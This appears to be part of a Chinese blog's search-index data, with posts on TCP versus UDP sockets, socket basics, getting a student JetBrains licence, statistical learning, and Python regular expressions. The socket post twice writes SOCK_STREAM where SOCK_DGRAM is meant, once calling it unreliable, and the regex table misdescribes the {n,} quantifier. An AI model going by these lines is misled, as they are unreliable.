路径4：H1–&gt;A–&gt;B–&gt;C–&gt;E–&gt;H6 路径5：H1–&gt;A–&gt;C–&gt;B–&gt;D–&gt;E–&gt;H6 数据包的传输路径是由路由器根据算法出来的，算法会考虑很多因素，比如网络的拥堵状况、下一个路由器是否忙碌等。 Datagram Sockets对于Datagram Sockets，每个数据包可以选择不同的路径，比如第一个数据包选择路径4，第二个数据包选择路径1，第三个数据包选择路径2…当然，它们也可以选择相同的路径，那也只不过是巧合而已。每个数据包之间都是独立的，各走各的路，谁也不影响谁，除了迷路的或者发生意外的数据包，最后都能到达H6.但是，到达的顺序是不确定的，比如： 第一个数据包选择了一条比较长的路径（比如路径5），第三个数据包选择了一条比较短的路径（比如路径1），虽然一个数据包很早就出发了，但是走的路比较远，最终还是晚于第三个数据包达到。 第一个数据包选择了比较短的路径（比如路径1），第三个数据包选择了一条比较长的路径（比如路径5），按理说第一个数据包应该先到达，但是非常不幸，第一个数据包走的路比较拥堵，这条路上的数据量非常大，路由器处理的很慢，所以它还是晚于第三个数据包达到了。 还有一些意外情况会发生，比如： 第一个数据包选择了路径1，但是路由器C突然断电了，那他就到不了H6了 第三个数据包选择了路径2，虽然路不远，但是太拥堵，以至于他等待的时间太长，路由器把它丢弃了。 总之，对于Datagram Sockets，数据包在传输过程中会发生各种不测，也会发生各种奇迹。H1只负责把数据包发出，至于她什么时候到达，先到达还是后到达，有没有成功到达，H1都不管了；H6也没有选择的权利，只能被动接收，收到什么算什么，爱用不用。 Datagram Sockets遵循的是【尽最大努力交付】的原则，就是尽力而为，实在做不了也没办法。Datagram Sockets提供的没有质量保证的服务。 Stream SocketsStream Sockets在正式通信之前要先确定一条路径，没有特殊情况的话，以后就固定地使用这条路径来传递数据包了。当然，路径被破坏的话，比如某个路由器断电了，那么就会重新建立路径。这条路径是由路由器维护的，路径上所有的路由器都要存储该路径地信息（实际上只需要存储上游和下游两个路由器地位置就行），所以路由器是有开销的。H1和H6通信完毕后，要断开连接，销毁路径，这个时候路由器也会把之前存储的路径信息擦除。 在很多网络通信教材中，这条预先建立好的路径被称为“虚电路”，就是一条虚拟的通信电路。 为了保障数据包准确、顺序地到达，发送端在发送数据包后，必须得到接收端地确认才发送下一个数据包；如果数据包发出去了，一段时间以后仍没有得到接收端地回应，那么发送端会重新再发送一次，直到得到接收端的回应。这样一来，发送端发送的所有数据包都能到达接收端，并且是按照顺序到达的。 发送端发送一个数据包，如何得到接收端的确认呢？很简单，为每个数据包分配一个ID，接收端接收到数据包以后，再给发送端返回一个数据包，告诉发送端我接收到了ID为xxxxx的数据包。 Stream Sockets会比Datagram Sockets多出很多数据包，因为发送端每发送一个数据包，接收端就会返回一个数据包。此外，建立连接和断开连接的过程也会传递很多数据包。 不但是数量多了，每个数据包也变大了：除了源端口和目的端口，Stream Sockets还包括序号、确认信号、数据偏移、控制标志（通常说的URG、ACK、PSH、RST、SYN、FIN）、窗口、检验和紧急指针、选项等信息；Datagram Sockets则只包含长度、校验和信息。 Stream Sockets的数据包比Datagram Sockets大很多，这意味着更大的负载和更大的带宽。许多即时聊天软件采用UDP协议（Datagram Sockets），与此有莫大的关系。 总结： Datagram Sockets传输效率高，但是不可靠，有丢失数据包、捣乱数据的风险 Stream Sockets非常可靠，万无一失，但是传输效率低，耗费资源多。 两种套接字的特点决定了他们的应用场景，有些服务对可靠性要求比较高，必须数据包能完整无误地送达，那就得选择Stream Sockets（TCP服务），比如HTTP、FTP等；而另一些服务，并不需要那么高的可靠性，效率和实时才是它们所关心的，那就可以选择Datagram Sockets（UDP服务），比如DNS、即时聊天工具等。","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"网络编程","slug":"网络编程","permalink":"http://1905060202.github.io/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"socket","slug":"socket","permalink":"http://1905060202.github.io/tags/socket/"},{"name":"C语言中文网","slug":"C语言中文网","permalink":"http://1905060202.github.io/tags/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E6%96%87%E7%BD%91/"}]},{"title":"玩转socket（二）","date":"2021-04-21T11:41:20.000Z","path":"2021/04/21/玩转socket（二）/","text":"套接字有哪些类型？socket有哪些类型？这个世界上有很多种套接字（socket），比如DAPRA Internet地址（Internet套接字）、本地节点的路径名（Unix套接字）、CCITT X.25地址（X.25套接字）等。本文只讨论Internet套接字。根据数据的传输方式，可以将Internet套接字分成两种类型（其实还有很多种）。通过socket()函数创建链接时，必须告诉它使用哪种数据传输方式。 流格式套接字（SOCK_STREAM） 数据报格式套接字（SOCK_DGRAM） Stream SocketsStream Sockets也叫 “面向连接的套接字” ，在代码中使用SOCK_STREAM表示。 Stream Sockets是一种可靠的、双向的通信数据流，数据可以准确无误地到达另一台计算机，如果损坏或丢失，可以重新发送 Stream Sockets有以下几个特征： 数据在传输过程中不会消失 数据是按照顺序传输的 数据的发送和接收不是同步的（也称“不存在数据边界”） 可以将Stream Sockets比喻成一条传送带，只要传送带本身没问题（不会断网），就能保证数据不丢失；同时，较晚传输的数据不会先到达，较早传输的数据不会晚到达，这就保证了数据是按照顺序传递的。为什么Stream Sockets可以达到高质量的数据传输呢？这是因为它使用了TCP协议（The Transmission Control Protocol，传输控制协议），TCP协议会控制你的数据按照顺序达到并且没有错误。你也许见过TCP，是因为经常听说“TCP/IP”。TCP用来确保数据的正确性，IP（Internet Protocol，网络协议）用来控制数据如何从源头到达目的地，也就是常说的“路由”。 那么，数据地发送和接收不同步该如何理解呢？ 假设传送带传送的是水果，接收者需要凑齐100个后才能装袋，但是传送带可能把这100个水果分批传送，比如第一批传送20个，第二批传送50个，第三批传送30个。接收者不需要和传送带保持同步，只要根据自己的节奏来装袋即可。不用管传送带传送了几批，也不用每到一批就装袋一次，可以等到凑够了100个水果再装袋。 Stream Sockets地内部有提个缓冲区（也就是字符数组），通过socket传输的数据将保存到这个缓冲区。接收端再收到数据后并不一定立即读取，只要数据不超过缓冲区容量，接收端有可能在缓冲区被填满以后一次性读取，也可能分好几次读取。 也就是说，不管数据分几次传送过来，接收端只需要根据自己的要求读取，不用非得在数据达到时立即读取。传送端有自己的节奏，接收端也有自己的节奏，他们是不一致的。 Stream Sockets有什么实际的应用场景吗？浏览器所使用的http协议就基于Stream Sockets，因为必须要保证数据准确无误，否则加载的HTML将无法解析。 Datagram SocketsDatagram Sockets也叫“无连接的套接字”，在代码中使用SOCK_DGRAM表示。 计算机只管传输数据，不做数据校验，如果数据在传输中损坏，或者没有达到另一台计算机，是没有办法补救的。也就是说，数据错了就错了，无法重传。 因为Datagram Sockets所做的校验工作少，所以在传输效率方面比Stream Sockets高。可以将Datagram Sockets比喻成高速移动的摩托车快递，它有以下特征： 强调快速传输而非传输顺序 传输的数据可能丢失也可能损毁 限制每次传输的数据大小 数据的发送和接受是同步的（也称“存在数据边界”） 众所周知，速度是快递行业的生命。用摩托车发往同一地点的两件包裹无需保证顺序，只要以最快的速度叫个客户就好。这种方式存在损坏或丢失的风险，而且包裹大小有一定的限制。因此，想要传递大量包裹，就得分配发送。另外，用摩托车分别发送两件包裹，那么接收者也需要分两次接收，所以“数据的发送和接收是同步的”，换句话说，接受次数和发送次数相同。总之，SOCK_STREAM是一种不可靠的、不按顺序传输的、以追求速度为目的的套接字 Datagram Sockets也使用IP协议作路由，但是它不使用TCP协议，而是使用UDP（User Datagram Protocol，用户数据协议）。 QQ视频聊天和语音聊天就使用SOCK_STREAM来传送数据，因为首先要保证通信的效率，尽量减少延迟，而数据的正确性是次要的，即使丢失很小的一部分数据，视频和音频也可以正常解析，最多出现噪点或杂音，不会对通信质量有实质的影响。 Datagram Sockets没有想象中的糟糕，不会频繁的丢失数据，数据错误只是小概率事件。","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"网络编程","slug":"网络编程","permalink":"http://1905060202.github.io/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"socket","slug":"socket","permalink":"http://1905060202.github.io/tags/socket/"},{"name":"C语言中文网","slug":"C语言中文网","permalink":"http://1905060202.github.io/tags/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E6%96%87%E7%BD%91/"}]},{"title":"玩转socket（一）","date":"2021-04-21T11:13:19.000Z","path":"2021/04/21/玩转socket（一）/","text":"什么是socket？socket的原意是“插座”，在计算机通信领域，socket被翻译成“套接字”，它是计算机之间进行通信的一种约定或一种方式。通过socket这种约定，一台计算机可以接收其他计算机的数据，也可以向其他计算机发送数据。 把充电器插头插到插座上就能从电网获取电力供应给手机充电，同样的，为了与远程计算机进行数据传输，需要连接到互联网，而socket就是用来连接到互联网的工具。 socket的典型应用就是Web服务器和浏览器：浏览器获取用户输入的URL，向服务器发起请求，服务器分析接收到的URL，将对应的网页的内容返回给浏览器，浏览器再经过解析和渲染，就将文字、图片、视频等元素呈现给用户。 UNIX/Linux中的socket是什么？在UNIX/Linux系统中，为了统一对各种硬件的操作，简化接口，不同的硬件设备也都被看成一个文件。对这些文件的操作，等同于对磁盘上普通文件的操作。 UNIX/Linux中的一切都是文件 为了表示和区分已经打开的文件，UNIX/Linux会给每个文件分配一个ID，这个ID就是一个整数，被称为文件描述符。例如： 通常用0来表示标准输入文件（stdin），它对应的硬件设备就是键盘； 通常用1来表示标准输出文件（stdout），它对应的硬件设备就是显示器。 UNIX/Linux程序在执行任何形式的I/O操作时，都是在读取或写入一个文件描述符。一个文件描述符只是一个和打开的文件相关联的整数，它的背后可能是一个硬盘上的普通文件、FIFO、管道，终端键盘、显示器，甚至是一个网络连接。 网络链接也是一个文件，它也有文件描述符！ 我们可以通过socket()函数来创建一个网络连接，或者说打开一个网络文件，socket()的返回值就是文件描述符。有了文件描述符，我们就可以使用普通的文件操作函数来传输数据了，例如： 用read()读取从远程计算机传来的数据 用write()向远程计算机写入数据。 Windows系统中的socket是什么？Windows也有类似“文件描述符”的概念，但通常被称为“文件句柄”。与UNIX/Linux不同的是，Windows会区分socket和文件，Windows就把socket当作一个网络链接来对待，因此需要调用专门针对socket而设计的数据传输函数，针对普通文件的输入输出函数就无效了。","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"网络编程","slug":"网络编程","permalink":"http://1905060202.github.io/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"socket","slug":"socket","permalink":"http://1905060202.github.io/tags/socket/"},{"name":"C语言中文网","slug":"C语言中文网","permalink":"http://1905060202.github.io/tags/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E6%96%87%E7%BD%91/"}]},{"title":"HNUST之学子如何免费使用pycharm等jetbrains系列工具","date":"2021-04-19T09:01:34.000Z","path":"2021/04/19/HNUST之学子如何免费使用pycharm等jetbrains系列工具/","text":"湖南科大学子如何免费使用jetbrains系列开发工具实际上这种方法各高校普适，但本文只针对湖南科大学子。我们以pycharm为例。 1.进入学生申请网址点我白嫖 2.填写信息点击立即申请信息如实填写，最重要的步骤是把学校的邮箱写进去。那么如何申请科大的邮箱呢？ 打开微信 打开湖南科技大学企业号 打开网络信息服务 进入科大邮箱服务 申请邮箱 更改密码完成如上步骤后，我们就拥有了科大邮箱。邮箱地址为：学号@mail.hnust.edu.cn申请完后，如实填写邮箱地址，然后进行申请。申请后，官网会向我们申请的科大邮箱发一份邮件，进行验证。此时我们需要打开腾讯企业邮箱，输入邮箱地址和密码，进入验证。大功告成！！！3.打开软件，开始白嫖","comments":true,"categories":[{"name":"经验分享","slug":"经验分享","permalink":"http://1905060202.github.io/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"学生党","slug":"学生党","permalink":"http://1905060202.github.io/tags/%E5%AD%A6%E7%94%9F%E5%85%9A/"},{"name":"白嫖","slug":"白嫖","permalink":"http://1905060202.github.io/tags/%E7%99%BD%E5%AB%96/"}]},{"title":"统计学习方法之监督学习（二）","date":"2021-04-18T15:51:48.000Z","path":"2021/04/18/统计学习方法之监督学习（二）/","text":"统计学习的分类统计学习或机器学习是一个范围宽阔、内容繁多、应用广泛的领域，并不存在（至少现在不存在）一个统一的理论体系涵盖所有内容。下面从几个角度对统计学习方法进行分类。 基本分类监督学习监督学习是指从标注数据中学习预测模型的机器学习的问题。标注数据表示输入输出的对应关系，预测模型对给定的输入产生相应的输出。监督学习的本质是学习输入到输出的映射的统计规律","comments":true,"categories":[{"name":"人工智能","slug":"人工智能","permalink":"http://1905060202.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://1905060202.github.io/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"统计学习方法","slug":"统计学习方法","permalink":"http://1905060202.github.io/tags/%E7%BB%9F%E8%AE%A1%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95/"}]},{"title":"统计学习方法之监督学习（一）","date":"2021-04-18T12:04:53.000Z","path":"2021/04/18/统计学习方法之监督学习（一）/","text":"统计学习统计学习的特点统计学习是关于计算机基于数据构建概率统计模型并运用模型对数据进行预测与分析的一门学科。统计学习也称为统计机器学习。= =。看了上面的定义，是不是觉得一团浆糊呢。但其实说的已经很清楚了，在这里我用自己的话总结一下。统计学习就是用数据建模型，再用建出来的模型对数据进行分析和预测的一个看起来高大上实则学起来也就那么回事的一门学科。 统计学习有诸多特点，在这里作简单概括： 统计学习以计算机和网络为平台，是建立在计算机和网络上的 统计学习以数据为研究对象，是数据驱动的学科 统计学习的目的是对数据进行预测与分析 统计学习以方法为中心，统计学习方法构建模型并应用模型进行预测与分析 统计学习是概率论、统计学、信息论、计算理论、最优化理论及计算机科学等多个领域的交叉学科。并且在发展中逐步形成独自的理论体系与方法论。 统计学习的对象统计学习的研究对象是数据。它从数据出发，提取数据的特征，抽象出数据的模型，发现数据中的知识，又回到对数据的分析与预测中去。统计学习关于数据的基本假设是同类数据具有一定的统计规律，这是统计学习的前提 统计学习的目的统计学习用于对数据的预测与分析，特别是对未知新数据的预测与分析。对数据的预测与分析是通过构建概率统计模型实现的。 统计学习的方法统计学习的方法可以概括如下： 从给定的、有限的、用于学习的训练数据集合出发，假设数据是独立同分布产生的 并且假设要学习的模型属于某个函数的集合，称为假设空间({f1,f2,f3,…,fn}) 应用某个评价准则，从假设空间选取一个最优模型，使它对已知的训练数据及未知的测试数据在给定的评价准则下有最优的预测 最优模型由算法实现 如此可知，统计学习方法包括模型的假设空间、模型选择的准则、模型学习的算法，简称为‘模型’，‘策略’，‘算法’。 实现统计学习方法的步骤如下： 得到一个有限的训练数据集合 确定包含所有可能的模型的假设空间，即学习模型的集合 确定模型选择的准则，即学习的策略 实现求解最优模型的算法，即学习的算法 通过学习方法选择最优模型 利用学习的最优模型对新数据进行预测和分析 = =。就先写到这里，这算对统计学习做了一个简单的概述，大致看一下即可。","comments":true,"categories":[{"name":"人工智能","slug":"人工智能","permalink":"http://1905060202.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://1905060202.github.io/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"统计学习方法","slug":"统计学习方法","permalink":"http://1905060202.github.io/tags/%E7%BB%9F%E8%AE%A1%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95/"}]},{"title":"python之正则表达式","date":"2021-04-15T16:07:04.000Z","path":"2021/04/16/python之正则表达式/","text":"学习基础：Python之正则表达式(引用runoob的正则表达式篇)正则表达式是一个特殊的字符序列，它能方便我们检查一个字符串是否与某种模式匹配。Python的re模块使Python语言拥有全部的正则表达式功能。 re.match函数re.match函数尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。函数语法： 1re.match(pattern, string, flags=0) 函数参数说明： 参数 描述 pattern 匹配的正则表达式 string 要匹配的字符串 flags 标志位，用于控制正则表达式的匹配方式 匹配成功re.match方法返回一个匹配的对象，否则返回None。可以使用group（num）或groups（）匹配对象函数来获取匹配表达式。 匹配对象方法 描述 group（num=0） 匹配的整个表达式的字符串，group（）可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组 groups（） 返回一个包含所有小组字符串的元组，从1到所含的小组号 实例： 12345#!/usr/bin/pythonimport reprint(re.match(&#x27;www&#x27;,&#x27;www.youtube.com&#x27;).span()) #在起始位置匹配print(re.match(&#x27;com&#x27;,&#x27;www.youtube.com&#x27;)) #不在起始位置匹配 以上实例运行输出结果为: (0,3)None 实例： 12345678910111213#!/usr/bin/python3import reline = &quot;Cats are smarter than dogs&quot;# .*表示任意匹配除换行符（\\n,\\r）之外的任何单个或多个字符# (.*?)表示“非贪婪”模式，只保存第一个匹配到的子串matchObj = re.match(r&#x27;(.*) are (.*?) .*&#x27;,line,re.M|re.I)if matchObj: print(&quot;matchObj.group():&quot;,matchObj.group()) print(&quot;match.group(1):&quot;,matchObj.group(1)) print(&quot;match.group(2):&quot;,matchObj.group(2))else: print(&quot;No match!&quot;) 以上实例执行结果如下： matchObj.group(): Cats are smarter than dogsmatchObj.group(1):CatsmatchObj.group(2):smarter re.search方法re.search扫描整个字符串并返回第一个成功的匹配函数语法： 1re.search(pattern, string, flags=0) 函数参数说明：同re.match实例： 123456#!/usr/bin/python3 import re print(re.search(&#x27;www&#x27;, &#x27;www.youtube.com&#x27;).span()) # 在起始位置匹配print(re.search(&#x27;com&#x27;, &#x27;www.youtube.com&#x27;).span()) # 不在起始位置匹配 以上实例运行输出结果为： (0,3)(12,15)实例： 1234567891011121314#!/usr/bin/python3 import re line = &quot;Cats are smarter than dogs&quot; searchObj = re.search( r&#x27;(.*) are (.*?) .*&#x27;, line, re.M|re.I) if searchObj: print (&quot;searchObj.group() : &quot;, searchObj.group()) print (&quot;searchObj.group(1) : &quot;, searchObj.group(1)) print (&quot;searchObj.group(2) : &quot;, searchObj.group(2))else: print (&quot;Nothing found!!&quot;) 以上实例运行输出结果为： searchObj.group() : Cats are smarter than dogssearchObj.group(1) : CatssearchObj.group(2) : smarter re.match与re.search的区别re.match 只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回 None，而 re.search 匹配整个字符串，直到找到一个匹配。实例： 1234567891011121314151617#!/usr/bin/python3 import re line = &quot;Cats are smarter than dogs&quot; matchObj = re.match( r&#x27;dogs&#x27;, line, re.M|re.I)if matchObj: print (&quot;match --&gt; matchObj.group() : &quot;, matchObj.group())else: print (&quot;No match!!&quot;) matchObj = re.search( r&#x27;dogs&#x27;, line, re.M|re.I)if matchObj: print (&quot;search --&gt; matchObj.group() : &quot;, matchObj.group())else: print (&quot;No match!!&quot;) 以上实例运行结果如下： No match!!search –&gt; matchObj.group() : dogs 检索和替换Python 的re模块提供了re.sub用于替换字符串中的匹配项。语法： 1re.sub(pattern, repl, string, count=0, flags=0) 参数： pattern : 正则中的模式字符串。 repl : 替换的字符串，也可为一个函数。 string : 要被查找替换的原始字符串。 count : 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。 flags : 编译时用的匹配模式，数字形式。 前三个为必选参数，后两个为可选参数。实例： 123456789101112#!/usr/bin/python3import re phone = &quot;2004-959-559 # 这是一个电话号码&quot; # 删除注释num = re.sub(r&#x27;#.*$&#x27;, &quot;&quot;, phone)print (&quot;电话号码 : &quot;, num) # 移除非数字的内容num = re.sub(r&#x27;\\D&#x27;, &quot;&quot;, phone)print (&quot;电话号码 : &quot;, num) 以上实例执行结果如下： 电话号码 : 2004-959-559电话号码 : 2004959559repl 参数是一个函数 以下实例中将字符串中的匹配的数字乘于 2： 1234567891011#!/usr/bin/python import re # 将匹配的数字乘于 2def double(matched): value = int(matched.group(&#x27;value&#x27;)) return str(value * 2) s = &#x27;A23G4HFD567&#x27;print(re.sub(&#x27;(?P&lt;value&gt;\\d+)&#x27;, double, s)) 执行输出结果为： A46G8HFD1134 compile 函数compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。 语法格式为： 1re.compile(pattern[, flags]) 参数： pattern : 一个字符串形式的正则表达式 flags 可选，表示匹配模式，比如忽略大小写，多行模式等，具体参数为： re.I 忽略大小写 re.L 表示特殊字符集 \\w, \\W, \\b, \\B, \\s, \\S 依赖于当前环境 re.M 多行模式 re.S 即为’ . ‘并且包括换行符在内的任意字符（’ . ‘不包括换行符） re.U 表示特殊字符集 \\w, \\W, \\b, \\B, \\d, \\D, \\s, \\S 依赖于 Unicode 字符属性数据库 re.X 为了增加可读性，忽略空格和’ # ‘后面的注释 实例 12345678910111213141516171819&gt;&gt;&gt;import re&gt;&gt;&gt; pattern = re.compile(r&#x27;\\d+&#x27;) # 用于匹配至少一个数字&gt;&gt;&gt; m = pattern.match(&#x27;one12twothree34four&#x27;) # 查找头部，没有匹配&gt;&gt;&gt; print( m )None&gt;&gt;&gt; m = pattern.match(&#x27;one12twothree34four&#x27;, 2, 10) # 从&#x27;e&#x27;的位置开始匹配，没有匹配&gt;&gt;&gt; print( m )None&gt;&gt;&gt; m = pattern.match(&#x27;one12twothree34four&#x27;, 3, 10) # 从&#x27;1&#x27;的位置开始匹配，正好匹配&gt;&gt;&gt; print( m ) # 返回一个 Match 对象&lt;_sre.SRE_Match object at 0x10a42aac0&gt;&gt;&gt;&gt; m.group(0) # 可省略 0&#x27;12&#x27;&gt;&gt;&gt; m.start(0) # 可省略 03&gt;&gt;&gt; m.end(0) # 可省略 05&gt;&gt;&gt; m.span(0) # 可省略 0(3, 5) 在上面，当匹配成功时返回一个 Match 对象，其中： group([group1, …]) 方法用于获得一个或多个分组匹配的字符串，当要获得整个匹配的子串时，可直接使用 group() 或 group(0)； start([group]) 方法用于获取分组匹配的子串在整个字符串中的起始位置（子串第一个字符的索引），参数默认值为 0； end([group]) 方法用于获取分组匹配的子串在整个字符串中的结束位置（子串最后一个字符的索引+1），参数默认值为 0； span([group]) 方法返回 (start(group), end(group))。 再看看一个例子： 1234567891011121314151617181920212223&gt;&gt;&gt;import re&gt;&gt;&gt; pattern = re.compile(r&#x27;([a-z]+) ([a-z]+)&#x27;, re.I) # re.I 表示忽略大小写&gt;&gt;&gt; m = pattern.match(&#x27;Hello World Wide Web&#x27;)&gt;&gt;&gt; print( m ) # 匹配成功，返回一个 Match 对象&lt;_sre.SRE_Match object at 0x10bea83e8&gt;&gt;&gt;&gt; m.group(0) # 返回匹配成功的整个子串&#x27;Hello World&#x27;&gt;&gt;&gt; m.span(0) # 返回匹配成功的整个子串的索引(0, 11)&gt;&gt;&gt; m.group(1) # 返回第一个分组匹配成功的子串&#x27;Hello&#x27;&gt;&gt;&gt; m.span(1) # 返回第一个分组匹配成功的子串的索引(0, 5)&gt;&gt;&gt; m.group(2) # 返回第二个分组匹配成功的子串&#x27;World&#x27;&gt;&gt;&gt; m.span(2) # 返回第二个分组匹配成功的子串索引(6, 11)&gt;&gt;&gt; m.groups() # 等价于 (m.group(1), m.group(2), ...)(&#x27;Hello&#x27;, &#x27;World&#x27;)&gt;&gt;&gt; m.group(3) # 不存在第三个分组Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;IndexError: no such group findall在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。 注意： match 和 search 是匹配一次 findall 匹配所有。语法格式为： 123re.findall(pattern, string, flags=0)或pattern.findall(string[, pos[, endpos]]) 参数： pattern 匹配模式。 string 待匹配的字符串。 pos 可选参数，指定字符串的起始位置，默认为 0。 endpos 可选参数，指定字符串的结束位置，默认为字符串的长度。 查找字符串中的所有数字： 1234567891011import re result1 = re.findall(r&#x27;\\d+&#x27;,&#x27;runoob 123 google 456&#x27;) pattern = re.compile(r&#x27;\\d+&#x27;) # 查找数字result2 = pattern.findall(&#x27;runoob 123 google 456&#x27;)result3 = pattern.findall(&#x27;run88oob123google456&#x27;, 0, 10) print(result1)print(result2)print(result3) 输出结果： 123[&#x27;123&#x27;, &#x27;456&#x27;][&#x27;123&#x27;, &#x27;456&#x27;][&#x27;88&#x27;, &#x27;12&#x27;] re.finditer和 findall 类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回。 1re.finditer(pattern, string, flags=0) 参数 描述 pattern 匹配的正则表达式 string 要匹配的字符串 flags 标志位，用于控制正则表达式的匹配方式 实例： 12345import re it = re.finditer(r&quot;\\d+&quot;,&quot;12a32bc43jf3&quot;) for match in it: print (match.group() ) 输出结果： 1232433 re.splitsplit 方法按照能够匹配的子串将字符串分割后返回列表，它的使用形式如下： 1re.split(pattern, string[, maxsplit=0, flags=0]) 参数： 参数 描述 pattern 匹配的正则表达式 string 要匹配的字符串 maxsplit 分隔次数，maxsplit=1 分隔一次，默认为 0，不限制次数 flags 标志位，用于控制正则表达式的匹配方式 实例： 12345678910&gt;&gt;&gt;import re&gt;&gt;&gt; re.split(&#x27;\\W+&#x27;, &#x27;runoob, runoob, runoob.&#x27;)[&#x27;runoob&#x27;, &#x27;runoob&#x27;, &#x27;runoob&#x27;, &#x27;&#x27;]&gt;&gt;&gt; re.split(&#x27;(\\W+)&#x27;, &#x27; runoob, runoob, runoob.&#x27;) [&#x27;&#x27;, &#x27; &#x27;, &#x27;runoob&#x27;, &#x27;, &#x27;, &#x27;runoob&#x27;, &#x27;, &#x27;, &#x27;runoob&#x27;, &#x27;.&#x27;, &#x27;&#x27;]&gt;&gt;&gt; re.split(&#x27;\\W+&#x27;, &#x27; runoob, runoob, runoob.&#x27;, 1) [&#x27;&#x27;, &#x27;runoob, runoob, runoob.&#x27;] &gt;&gt;&gt; re.split(&#x27;a*&#x27;, &#x27;hello world&#x27;) # 对于一个找不到匹配的字符串而言，split 不会对其作出分割[&#x27;hello world&#x27;] 正则表达式对象re.RegexObjectre.compile() 返回 RegexObject 对象。re.MatchObject group() 返回被 RE 匹配的字符串。 start() 返回匹配开始的位置 end() 返回匹配结束的位置 span() 返回一个元组包含匹配 (开始,结束) 的位置正则表达式修饰符 - 可选标志正则表达式可以包含一些可选标志修饰符来控制匹配的模式。修饰符被指定为一个可选的标志。多个标志可以通过按位 OR(|) 它们来指定。如 re.I | re.M 被设置成 I 和 M 标志： 修饰符 描述 re.I 使匹配对大小写不敏感 re.L 做本地化识别（locale-aware）匹配 re.M 多行匹配，影响 ^ 和 $ re.S 使 . 匹配包括换行在内的所有字符 re.U 根据Unicode字符集解析字符。这个标志影响 \\w, \\W, \\b, \\B. re.X 该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。 正则表达式模式模式字符串使用特殊的语法来表示一个正则表达式： 字母和数字表示他们自身。一个正则表达式模式中的字母和数字匹配同样的字符串。 多数字母和数字前加一个反斜杠时会拥有不同的含义。 标点符号只有被转义时才匹配自身，否则它们表示特殊的含义。 反斜杠本身需要使用反斜杠转义。 由于正则表达式通常都包含反斜杠，所以你最好使用原始字符串来表示它们。模式元素(如 r’\\t’，等价于 \\t )匹配相应的特殊字符。 下表列出了正则表达式模式语法中的特殊元素。如果你使用模式的同时提供了可选的标志参数，某些模式元素的含义会改变。 模式 描述 ^ 匹配字符串的开头 $ 匹配字符串的末尾。 . 匹配任意字符，除了换行符，当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符。 […] 用来表示一组字符,单独列出：[amk] 匹配 ‘a’，’m’或’k’ [^…] 不在[]中的字符：[^abc] 匹配除了a,b,c之外的字符。 re* 匹配0个或多个的表达式。 re+ 匹配1个或多个的表达式。 re? 匹配0个或1个由前面的正则表达式定义的片段，非贪婪方式 re{ n} 匹配n个前面表达式。例如，”o{2}”不能匹配”Bob”中的”o”，但是能匹配”food”中的两个o。 re{ n,} 精确匹配n个前面表达式。例如，”o{2,}”不能匹配”Bob”中的”o”，但能匹配”foooood”中的所有o。”o{1,}”等价于”o+”。”o{0,}”则等价于”o*”。 re{ n, m} 匹配 n 到 m 次由前面的正则表达式定义的片段，贪婪方式 a b (re) 匹配括号内的表达式，也表示一个组 (?imx) 正则表达式包含三种可选标志：i, m, 或 x 。只影响括号中的区域。 (?-imx) 正则表达式关闭 i, m, 或 x 可选标志。只影响括号中的区域。 (?: re) 类似 (…), 但是不表示一个组 (?imx: re) 在括号中使用i, m, 或 x 可选标志 (?-imx: re) 在括号中不使用i, m, 或 x 可选标志 (?#…) 注释. (?= re) 前向肯定界定符。如果所含正则表达式，以 … 表示，在当前位置成功匹配时成功，否则失败。但一旦所含表达式已经尝试，匹配引擎根本没有提高；模式的剩余部分还要尝试界定符的右边。 (?! re) 前向否定界定符。与肯定界定符相反；当所含表达式不能在字符串当前位置匹配时成功。 (?&gt; re) 匹配的独立模式，省去回溯。 \\w 匹配数字字母下划线 \\W 匹配非数字字母下划线 \\s 匹配任意空白字符，等价于 [\\t\\n\\r\\f]。 \\S 匹配任意非空字符 \\d 匹配任意数字，等价于 [0-9]。 \\D 匹配任意非数字 \\A 匹配字符串开始 \\Z 匹配字符串结束，如果是存在换行，只匹配到换行前的结束字符串。 \\z 匹配字符串结束 \\G 匹配最后匹配完成的位置。 \\b 匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\\b’ 可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。 \\B 匹配非单词边界。’er\\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。 \\n, \\t, 等。 